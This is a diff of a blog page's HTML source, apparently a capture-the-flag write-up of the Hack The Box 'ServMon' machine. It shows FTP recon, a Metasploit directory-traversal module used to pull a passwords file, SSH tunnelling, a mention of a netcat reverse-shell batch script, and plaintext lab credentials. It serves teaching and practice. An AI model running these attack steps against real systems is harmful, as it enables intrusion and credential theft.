-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;player2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; 
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; 
 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/home/kali/HTB/boxes/player2/binary_2/libc.so.6'&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;Arch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;little&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;RELRO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Partial&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RELRO&lt;/span&gt;
@@ -1211,7 +1350,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 &lt;p class=&quot;text-justify&quot;&gt;This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others’ files I think this box teaches what I call &lt;em&gt;gentleman behaviour&lt;/em&gt;. Try to not mess with other peoples stuff when working on the same box.&lt;/p&gt;
 &lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
 &lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan reveals&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE
 21/tcp   open  ftp
 22/tcp   open  ssh
 80/tcp   open  http
@@ -1223,128 +1362,128 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 8443/tcp open  https-alt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Logging into ftp anonymously we find two users &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Users&lt;/code&gt; folder. From Nadine’s folder we get a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Notes to do.txt&lt;/code&gt; from Nathan:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Confidential.txt
-Nathan,
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Confidential.txt
+&lt;span class=&quot;go&quot;&gt;Nathan,
 
 I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
 
 Regards
 
 Nadine
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Notes&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;to&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt 
-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Change the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;NVMS - Complete
-2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Lock down the NSClient Access - Complete
-3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Upload the passwords
-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Remove public access to NVMS
-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Place the secret files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;SharePoint
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Notes&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;to&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;.txt 
+&lt;span class=&quot;go&quot;&gt;1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Not much to continue from. So we are done with ftp, since we have no creds for ssh we go over to the web page and see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt; running and a login prompt. Trying standard passwords does not work but&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit nvms
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;searchsploit nvms
+&lt;span class=&quot;go&quot;&gt;------------------------------------------------------- ----------------------------------------
  Exploit Title                                         |  Path
-                                                       | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+                                                       | (/usr/share/exploitdb/)
+------------------------------------------------------- ----------------------------------------
 NVMS 1000 - Directory Traversal                        | exploits/hardware/webapps/47774.txt
 
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
-&lt;span class=&quot;c&quot;&gt;# Title: NVMS-1000 - Directory Traversal&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Date: 2019-12-12&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Title: NVMS-1000 - Directory Traversal
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Date: 2019-12-12
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;reveals a relatively new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; vulnerability and combining with the info from the note, we know that there’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; file in Nathans Desktop, likely to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Nathan\Desktop\Passwords.txt&lt;/code&gt; - that looks promising. So we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo msfconsole&lt;/code&gt; and search the exploit:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search nvms
-
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;search nvms
+&lt;span class=&quot;go&quot;&gt;
 Matching Modules
-&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;
+================
 
-   &lt;span class=&quot;c&quot;&gt;#  Name                                       Disclosure Date  Rank    Check  Description&lt;/span&gt;
-   -  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;    &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;Name                                       Disclosure Date  Rank    Check  Description
+&lt;span class=&quot;go&quot;&gt;   -  ----                                       ---------------  ----    -----  -----------
    0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
 
 
-msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/http/tvt_nvms_traversal
-msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options
-
-Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;use auxiliary/scanner/http/tvt_nvms_traversal
+&lt;span class=&quot;gp&quot;&gt;msf5 auxiliary(scanner/http/tvt_nvms_traversal) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;show options
+&lt;span class=&quot;go&quot;&gt;
+Module options (auxiliary/scanner/http/tvt_nvms_traversal):
 
    Name       Current Setting   Required  Description
-   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-   DEPTH      13                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Depth &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Path Traversal
-   FILEPATH   /windows/win.ini  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The path to the file to &lt;span class=&quot;nb&quot;&gt;read
-   &lt;/span&gt;Proxies                      no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
-   RHOSTS                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+   ----       ---------------   --------  -----------
+   DEPTH      13                yes       Depth for Path Traversal
+   FILEPATH   /windows/win.ini  yes       The path to the file to read
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;We need to set RHOSTS which is the IP of the box 10.10.10.184 and we also notice the FILEPATH &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/windows/win.ini&lt;/code&gt; which is the short form for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt; therefore we&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.184
-RHOSTS &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.10.184
-msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;FILEPATH /Users/Nathan/Desktop/Passwords.txt
-FILEPATH &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /Users/Nathan/Desktop/Passwords.txt
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 auxiliary(scanner/http/tvt_nvms_traversal) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.184
+&lt;span class=&quot;gp&quot;&gt;RHOSTS =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.184
+&lt;span class=&quot;gp&quot;&gt;msf5 auxiliary(scanner/http/tvt_nvms_traversal) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;FILEPATH /Users/Nathan/Desktop/Passwords.txt
+&lt;span class=&quot;gp&quot;&gt;FILEPATH =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/Users/Nathan/Desktop/Passwords.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;and run the exploit&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/http/tvt_nvms_traversal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.184:80 - Downloaded 156 bytes
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File saved &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Scanned 1 of 1 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 auxiliary(scanner/http/tvt_nvms_traversal) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;run
+&lt;span class=&quot;go&quot;&gt;
+[+] 10.10.10.184:80 - Downloaded 156 bytes
+[+] File saved in: /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;We see the exploit has created a text file and looking into it we find creds:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
-
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
+&lt;span class=&quot;go&quot;&gt;
 1nsp3ctTh3Way2Mars!
 Th3r34r3To0M4nyTrait0r5!
 B3WithM30r4ga1n5tMe
 L1k3B1gBut7s@W0rk
 0nly7h3y0unGWi11F0l10w
 IfH3s4b0Utg0t0H1sH0me
-Gr4etN3w5w17hMySk1Pa5&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Gr4etN3w5w17hMySk1Pa5$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Trying these a little bit we find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L1k3B1gBut7s@W0rk&lt;/code&gt; works for Nadine via ssh:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh nadine@10.10.10.184
-nadine@10.10.10.184&lt;span class=&quot;s1&quot;&gt;'s password: 
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh nadine@10.10.10.184
+&lt;span class=&quot;go&quot;&gt;nadine@10.10.10.184's password: 
 Microsoft Windows [Version 10.0.18363.752]          
 (c) 2019 Microsoft Corporation. All rights reserved.
                                                     
-nadine@SERVMON C:\Users\Nadine&amp;gt; dir Desktop          
- Volume in drive C has no label.                  
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;nadine@SERVMON C:\Users\Nadine&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir &lt;/span&gt;Desktop          
+&lt;span class=&quot;go&quot;&gt; Volume in drive C has no label.                  
  Volume Serial Number is 728C-D22C                
                                                   
  Directory of C:\Users\Nadine\Desktop             
                                                   
-08/04/2020  22:28    &amp;lt;DIR&amp;gt;          .             
-08/04/2020  22:28    &amp;lt;DIR&amp;gt;          ..            
-17/04/2020  08:31                34 user.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;08/04/2020  22:28    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;             
+&lt;span class=&quot;gp&quot;&gt;08/04/2020  22:28    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;..            
+&lt;span class=&quot;go&quot;&gt;17/04/2020  08:31                34 user.txt
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;and we have completed user.&lt;/p&gt;
 &lt;h1 id=&quot;root-part&quot;&gt;Root part&lt;/h1&gt;
 &lt;p&gt;For the root part we look into the NSClient mentioned in Nathans notes in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\NSClient++&lt;/code&gt;.
 Looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsclient.ini&lt;/code&gt; we see plaintext creds and allowed hosts:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
-password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Undocumented key
+&lt;span class=&quot;go&quot;&gt;password = ew2x6SsGTxjRwXOT
 
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
-allowed hosts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 127.0.0.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Undocumented key
+&lt;span class=&quot;go&quot;&gt;allowed hosts = 127.0.0.1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;So we can connect to the service from localhost only, therefore we need a ssh tunnel:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8443:127.0.0.1:8443 nadine@10.10.10.184
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8443:127.0.0.1:8443 nadine@10.10.10.184
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;and entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:8443&lt;/code&gt; the NSClient++ asks for a password but the password from nsclient.ini will do the job.
 This is where the heated discussion began:
 Searching for a common exploit through metasploit revealed:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit nsclient
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;searchsploit nsclient
+&lt;span class=&quot;go&quot;&gt;------------------------------------------------------- ----------------------------------------
  Exploit Title                                         |  Path
-                                                       | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+                                                       | (/usr/share/exploitdb/)
+------------------------------------------------------- ----------------------------------------
 NSClient++ 0.5.2.35 - Privilege Escalation             | exploits/windows/local/46802.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p class=&quot;text-justify&quot;&gt;and checking the NSClient++ page we see that this is the latest version available. In the text file are seven steps outlined to compromise the system. It turns out that only a few of the steps need to be done and especially the last command will crash the NSClient for all users on the box. Furthermore the steps require to upload a script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.bat&lt;/code&gt; which simply calls netcat and establishes a connection to our attacking machine. Since the script has to contain the IP of each user it has the risk of being overwritten. Obviously crashing the server is not the intended way and one has to be careful not to overwrite others scripts.&lt;/p&gt;
-&lt;p&gt;The &lt;em&gt;intended&lt;/em&gt; way to load the script is through the API:&lt;/p&gt;
+&lt;p&gt;The way to load the script is through the API:&lt;/p&gt;
 &lt;ol&gt;
